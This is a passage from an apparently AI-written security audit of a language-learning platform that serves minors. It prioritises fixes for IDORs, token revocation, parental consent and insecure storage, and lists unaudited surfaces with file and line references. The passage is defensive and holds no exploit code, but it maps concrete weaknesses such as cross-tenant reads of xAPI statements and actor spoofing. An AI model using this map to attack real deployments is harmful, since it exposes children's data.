- Pin the learner to the ownership-validated value in every body-learnerId path: in SessionHandler.Generate enforce profile.UserID == JWT user (or derive learner from ListByUserID); in SessionHandler.Submit add result.LearnerID = session.LearnerID immediately after verifySessionOwnership passes (session.go:265); in PlacementHandler.SubmitPlacement and GeneratePlacement add the same ownership check before any UpdateLevel/InitializeSkills/UpsertLearnerSkill (placement.go).
- Key the entire refresh-token lifecycle on jti (claims.ID): store, rotate, revoke, and check all on the same identifier so Logout's rt:revoked:<jti> is actually consulted by Refresh — fixes the logout/refresh revocation keyspace mismatch (auth.go:221, handler/auth.go:218,240).
- Turn the refresh-token store into a real allowlist: add GetRefreshToken to the TokenStore interface, require it to return ok==true AND userID==subject in RotateRefreshToken before rotating, and delete the old jti on rotation — so a leaked-but-signed refresh token is not accepted indefinitely (auth.go:208).
- Prevent the insecure devserver from ever shipping as prod: add //go:build devserver (and an ENVIRONMENT=='development' fatal guard), move it off port 8080, and remove/rename the launch.json 'Go Dev API' entry (cmd/devserver/main.go).

### Next / privacy + auth hardening — before onboarding minors or scaling
_These convert asserted privacy guarantees into enforced ones and remove controls that currently fail open. They are legally and reputationally load-bearing (COPPA/GDPR-K) and directly gate whether the product can legitimately serve the teen/kid segments it already ships onboarding for._

- Fail closed on minor tracking: replace the {kid,toddler} denylist with an adult-only allowlist on both server (analytics.go:33/76) and client (analytics.ts) so teen — and any future/unknown segment — is excluded by default; DELETE already-captured teen/toddler rows.
- Move parental consent server-side: add a consents table/endpoint capturing method, parent identity, and timestamp, persisted transactionally with kid profile creation; stop relying on localStorage kid_consent (signup/page.tsx); gate self-serve kid signup behind a parent-account model until verifiable consent exists.
- Stop persisting the access token in localStorage: keep it in memory for the bearer path, drive isAuthenticated() off a non-sensitive flag, and route all calls (including placement/page.tsx) through the same-origin /api proxy with credentials:'include' (auth.ts, api.ts, placement/page.tsx).
- Enforce the analytics 'no PII' invariant in code: drop the aria-label/textContent fallbacks in labelFor() (analytics.ts), and server-side allowlist/clamp the meta JSON in handler/analytics.go before InsertBatch.
- Fail closed on Redis errors for security counters: make lockout return locked/429 and rate-limit apply an in-process fallback limiter on Incr/Exists errors instead of failing open (redisstore/lockout.go, ratelimit.go); alert when degraded.
- Equalize login timing (dummy bcrypt on unknown email) and add IP-scoped anonymous throttling on /v1/auth/token and /register before the DB lookup; make admin-key comparison constant-time with subtle.ConstantTimeCompare over SHA-256 (admin.go:23, institution.go:38); enforce token type/iss/aud in ValidateToken and JWTAuth.

### Later / robustness + governance
_Lower individual severity, but they remove data-corruption and drift risks that surface under load, retries, and multi-device/multi-profile use, and close compliance gaps (deletion, retention). Batch these once the blockers and privacy fixes are in._

- Make session Complete idempotent (UPDATE ... WHERE status <> 'completed' returning RowsAffected; only then RecordActivity/UpdateLevel) and make concurrent result submits atomic (increment current_index/total_xp in SQL or SELECT ... FOR UPDATE) — session.go, store/session_item.go.
- Fix StreakStore.Get to distinguish pgx.ErrNoRows from real errors and skip the level update on read failure, so a transient error can't regress a learner to level 1 (store/streak.go, handler/session.go).
- Add a server-side floor to curriculum PutProgress so a less-complete blob cannot overwrite a more-complete stored one; reconcile the per-user-blob vs per-profile-level model (or enforce one profile per user); honor downward re-placement consistently (store/curriculum.go, profile.go, handler/curriculum.go).
- Add a self-service account-deletion endpoint (letting ON DELETE CASCADE purge analytics/profiles/sessions in the real pgx store) and a scheduled 90-day retention purge for analytics_events (migration 015).
- Fail fast on insecure prod config (require DATABASE_URL, reject sslmode=disable; remove/harden the unused default JWT_SECRET) in config.Load(); reconcile FK ON DELETE drift with a forward migration (001 vs 012); scope the refresh cookie to /v1/auth; add an Origin/CSRF check for cookie-auth mutations; bound/evict the in-memory rate-limiter map; and stop leaking raw jwt errors from LTI Launch.

## Residual risks (not fully fixable in code)

- Profile UUID discoverability is the enabling condition for the IDOR family — leaderboard, teacher search, and report responses expose learner/profile ids. Even after ownership checks are added, minimizing which ids are returned to clients (and not logging foreign segments) reduces enumeration surface; this is a design discipline that code fixes alone do not guarantee stays fixed.
- Verifiable parental consent (COPPA/GDPR-K) is fundamentally a process and product problem, not a code fix. A server-side consent record proves *that* an assertion was made, but genuine verification (parent-account model, signed form, nominal charge) requires an out-of-band flow and legal review; until that exists, holding minors' PII carries compliance risk regardless of the analytics suppression fix.
- SameSite=Lax plus an Origin check mitigates but does not eliminate CSRF for cookie-auth mutations across all browsers and the Chrome Lax+POST grace window; any future move to SameSite=None or a cross-origin deployment reopens it. True defense requires a CSRF token scheme, which is an architectural commitment.
- The httpOnly-cookie design only protects the refresh token; a live access token is still replayable off-origin for its TTL if stolen via XSS in the web bundle or a supply-chain-compromised dependency. Moving the access token out of localStorage helps, but any XSS foothold on the origin can still act as the user within the session — this is mitigated, never eliminated, in a browser SPA.
- Admin/institution endpoints are pure shared-secret (X-Admin-Key) with no network/IP restriction or mTLS. Constant-time comparison removes the timing side channel, but a single leaked or weak ADMIN_API_KEY still yields full role escalation and tenant creation; the real mitigation (network isolation, key rotation, minimum key length) is operational.
- Redis remains a single point of failure for brute-force and rate-limit protection and for lockout/nonce state. In-process fallbacks bound the damage during an outage but are per-instance and lossy across restarts/scaling, so protection is genuinely weaker in the degraded state than the steady state — an inherent limitation of the chosen architecture.
- Data already written before the fixes (teen/toddler analytics rows, cross-tenant-corrupted levels/skills, inflated XP from double-completes) is not repaired by forward code changes; it needs one-off cleanup/backfill scripts and, for corrupted mastery data, may not be fully recoverable to the correct prior state.

## Coverage gaps + net-new findings (completeness critic)

Confirmed. The xAPI LRS `Store`/`List` endpoints are open to any authenticated learner with NO actor/role scoping — `Recent` returns raw statements globally, so any student can read every user's activity log (PII/FERPA leak) and can also POST statements impersonating any actor. This whole surface was flagged as "real xAPI LRS" (task #33) but the authz was never audited. I now have a complete picture.

# COVERAGE GAPS — What the seven-dimension audit did NOT adequately verify

## 1. Python ML service (services/ml) — ENTIRELY UNAUDITED
- **No authentication / network isolation on the ML service.** `services/ml/src/main.py` exposes `POST /v1/classify-error` with zero auth, no API key, no allowlist. If bound to anything but loopback it is a fully open endpoint. Nothing in the repo pins it to loopback (no bind address, no Dockerfile — see gap #7). Check next: how `uvicorn` is launched and what interface it binds.
- **api→ml trust boundary is one-directional and untrusted-input.** `services/api/internal/client/ml.go` POSTs learner free-text (`learner_response`) to ML with a 5s timeout and swallows ALL failures as `nil, nil` (lines 62-76) — a compromised/malicious ML service can return arbitrary `explanation`/`suggestion` strings that flow back into session feedback (stored-XSS vector into the web client if rendered as HTML). The Go client never validates/sanitizes the ML response body. Check next: where `ClassifyErrorResponse.Explanation/Suggestion` is rendered in `apps/web`.
- **Request/response field-name mismatch (silent contract break).** Go sends `learner_response`/`learner_level`/`error_history:[{error_type,count}]`; Python `ClassifyErrorRequest` expects `response`/`learner_l1`/`error_history:[dict]` and returns no `suggestion` field. The integration is effectively dead/untested end-to-end — no contract test exists.
- **ML has no input-size / DoS bounds.** `classify_error` runs an O(n·m) Levenshtein (`_levenshtein_distance`) on unbounded client strings; no length cap in `main.py` (Pydantic model has no `max_length`). Adversarial long strings = CPU DoS on the ML tier.
- **ML test coverage:** only `services/ml/tests/test_error_classifier.py`; no test for the FastAPI layer, no test for the api↔ml wire contract.

## 2. Expo mobile app (apps/mobile) — ENTIRELY UNAUDITED (only the web client was in scope)
- **Tokens stored in plaintext `AsyncStorage`, not `expo-secure-store`.** `apps/mobile/src/lib/api.ts` (lines 13, 45-58) and `apps/mobile/app/(tabs)/practice.tsx:31` persist `access_token`/`refresh_token` in `AsyncStorage`, which is unencrypted on-device. `expo-secure-store` is even listed in `package.json` dependencies but never used. This is the mobile analog of the audited web `localStorage` finding, and arguably worse (long-lived refresh token in cleartext on a mobile device).
- **Mobile trusts `EXPO_PUBLIC_API_URL` with `http://localhost:8080` default** (`api.ts:3`) — no TLS enforcement, no cert pinning.
- **Mobile sends client-supplied `learnerId` to the same IDOR-vulnerable endpoints** (`generateSession`, `submitAnswer` in `api.ts:111-142`) — it is a second live client for the confirmed session/placement IDORs, so any mobile fix path must be considered.
- **No refresh-on-401 on mobile** — a 401 just wipes storage and logs out (`api.ts:29-32`), diverging from the web client's refresh flow.

## 3. xAPI LRS authz — MOUNTED, "built," but NEVER AUDITED (net-new critical finding)
- **`GET /v1/xapi/statements` leaks every user's statements to any authenticated learner.** `services/api/internal/store/xapi.go:36` `Recent()` runs `SELECT ... FROM xapi_statements ORDER BY stored_at DESC` with **no actor/tenant/role scoping**, and the route (`main.go:259`) is behind only `JWTAuth` (no role gate). Any student can read other learners' full activity records (names/emails inside the raw statement) — a FERPA/COPPA-grade cross-tenant PII disclosure.
- **`POST /v1/xapi/statements` allows actor spoofing.** `handler/xapi.go:30` stores the client-supplied `actor` verbatim with no check that it matches the caller — any learner can forge statements attributed to anyone. Migration confirms no `user_id` column tying a statement to its poster.

## 4. Event broker / streaming surface — MISCHARACTERIZED IN AUDIT SCOPE
- **The "websocket/SSE event broker" does not exist as a live surface.** Grep confirms **no** `text/event-stream`, `websocket`, `Upgrader`, or `http.Flusher` anywhere in `services/api`. `internal/event/broker.go` is an in-memory Kafka *simulation* that is **never instantiated by either server** (`event.NewBroker` has zero callers in `cmd/`). So the audit's SSE/websocket dimension audited nothing real — but the infra does declare a real Kafka + Meilisearch (see #7). The gap is the reverse of expected: dead code shipped, real infra unaudited.

## 5. LTI 1.3 launch — partially audited (raw-error echo caught), but deeper issues NOT verified
- **JWKS `kid` matching is permissive.** `handler/lti.go:226` matches when `k.Kid == kid || kid == ""` — if the id_token omits `kid`, the *first* RSA key in the JWKS is used, and `jwksKey` will also return a key for `kid == ""`. Combined with no `alg`-in-JWKS pinning, this weakens key-selection integrity.
- **JWKS fetched every launch with no caching and an SSRF-shaped fetch.** `jwksKey` (line 207) does a live `http.Get(h.cfg.JWKSURL)` on every launch — DoS amplification and no protection if `JWKSURL` is attacker-influenced via config. No `exp`/`iat`/`nbf` freshness check is asserted on the id_token beyond library defaults; no max-age.
- **LTI provisions real accounts from `email` claim with a random password** (`lti.go:164-172`) — account-takeover risk if a platform asserts an email that collides with an existing password-based account (it logs them into the existing account via `GetByEmail`). This account-linking collision was not audited.

## 6. Dependency / supply-chain & known-CVE risk — NOT ASSESSED AT ALL
- No SCA was run. Concrete next checks:
  - Go: `services/api/go.mod` pins `golang-jwt/jwt/v5 v5.2.1`, `pgx/v5 v5.7.4`, `go-chi/chi/v5 v5.2.1`, `redis/go-redis/v9 v9.21.0`, `golang.org/x/crypto v0.32.0`. Run `govulncheck ./...` and `go mod verify` — none of this was done.
  - Web: `apps/web/package.json` uses `next ^15.2.0` with `--turbopack`; a floating caret means the audited tree ≠ deployed tree. Run `npm audit` against `package-lock.json`.
  - Mobile: `apps/mobile/package.json` (`expo ~52`, `react-native 0.76.0`) has **no lockfile committed** in the mobile dir → non-reproducible builds; run `npm audit`/`expo-doctor`.
- No `go.sum`/lockfile integrity or license/provenance review was performed.

## 7. Secrets management, CI/CD, and deployment — LARGELY UNAUDITED
- **No CI at all.** `.github/` has only issue/PR templates; there is **no `.github/workflows/` directory**. So: no automated build/test gate, no `govulncheck`/`npm audit`, no secret-scanning, no lint gate. Nothing prevents the confirmed vulns from shipping. This also means the "devserver must never be built for production" finding has **no enforcement mechanism** (no build tag check in CI).
- **Infra secrets are hardcoded dev credentials in `infra/docker/docker-compose.yml`:** Postgres `russkiy/russkiy`, `MEILI_MASTER_KEY: russkiy-dev-key`, Kafka in `PLAINTEXT` with no auth, Redis with no password. If this compose is used as a deployment base (it mounts real migrations into `docker-entrypoint-initdb.d`), these are production-exposed.
- **Undeclared/unaudited services in the trust boundary:** the compose runs **Kafka (ports 9094 plaintext)** and **Meilisearch (7700, dev key)** that the Go/Python code does not appear to use — orphaned attack surface, or an integration that exists outside the audited code. Check next: any producer/consumer or search-index writer referencing `9092/9094/7700`.
- No Dockerfile exists for `services/api` or `services/ml` — how the ML service's bind address and the API's `ML_SERVICE_URL`/`ADMIN_API_KEY`/`JWT_PRIVATE_KEY_PATH` are provided in prod is unverified. `services/api/.env.example` is the only reference and was not reviewed against the fail-fast finding in `config.go`.

## 8. Test coverage of security-critical paths — NOT MEASURED
- Existing Go tests (`auth_test.go`, `gateway_test.go`, `broker_test.go`, engine `*_test.go`) cover crypto/engine mechanics but **there are no handler-level tests asserting authorization** — no test proves the session/placement IDORs are closed, no test for xAPI scoping, no test for analytics minor-suppression, no logout-revocation test. Recommend: add table-driven authz tests per protected route; run `go test ./... -cover` and gate handler packages.
- `gateway.go` `GenerateTestToken` (line 105) ignores its `accountType`/`ttl` args and hardcodes `"learner"` — test tokens don't reflect real role/TTL, so any authz test built on it is unsound.

## 9. Additional mounted-but-unaudited routes (verify each for ownership/role)
From `cmd/server/main.go` route table, these carry PII or mutate tenant state and are **not represented in the findings list**:
- `GET /v1/stats` (`stats.go`) — resolves learner from `GetUserID` then loads profile; verify it can't be steered to another profile. (Looks server-derived — likely OK, but unconfirmed by audit.)
- `GET /v1/leaderboard` (`teacherHandler.GetLeaderboard`, mounted for *any* authenticated user, line 220) — verify it doesn't expose real names/emails cross-tenant.
- Institution suite (`institution.go`): `Join`, `AcceptInvite`, `Invite`, `EnrolStudent`, `AssignCohort` — dean-scoping is checked via `deanInstitution`, but **invite tokens** (`CreateInvite`/`AcceptInvite`) were not audited for entropy, expiry, single-use, or email-mismatch bypass. Check `store/institution.go` token generation.
- `dean/*` (`dean.go`) and `admin/analytics/*` — role-gated to `dean`/`admin`, but the analytics dashboards (`Overview/Routes/Heatmap/Engagement`) read cross-user data; confirm the `admin` role can only be granted via the (timing-vulnerable) admin-key path and cannot be self-asserted in a JWT.
- `GET /v1/skills/me`, `/skills/weak`, `/sessions/history`, `/sessions/{id}/state` — verify all derive learner from the token, not from a path/body param (the confirmed IDORs suggest this pattern may recur here).

## 10. Analytics `meta` — partially audited, residual gaps
- The audit flagged verbatim `meta` storage. Still unverified: `store/analytics.go:315` does `meta->>'task'` in an aggregate query — confirm no SQL-injection via JSON path and that admin dashboards can't be poisoned by attacker-controlled `meta.task` values (stored-XSS into the admin analytics UI). The `element` truncation to 120 chars (`analytics.go:92`) limits but does not sanitize the PII/HTML the earlier finding described.

## Recommended next commands
- `cd services/api && govulncheck ./... && go test ./... -cover && go vet ./...`
- `cd apps/web && npm audit --production` ; `cd apps/mobile && npm audit` (add a lockfile first)
- `cd services/ml && pip-audit` (or `safety check`) and add `max_length` bounds + a bind-address/auth check
- Grep the deployment for how `services/ml` binds and whether `cmd/devserver` can reach a real build path (no CI = the "don't ship devserver" finding is unenforced)
- Add handler authz tests, starting with `xapi` (cross-tenant read), `session`/`placement` (IDOR closure), and `analytics` (minor + teen suppression).

Highest-severity net-new items surfaced here: **xAPI LRS cross-tenant statement read + actor spoofing (services/api/internal/store/xapi.go:36, handler/xapi.go:30)**, **mobile plaintext token storage (apps/mobile/src/lib/api.ts)**, **unauthenticated ML service + untrusted ML response fed back to clients (services/ml/src/main.py, services/api/internal/client/ml.go:62-76)**, and **no CI/enforcement so every confirmed finding can ship (no .github/workflows)**.
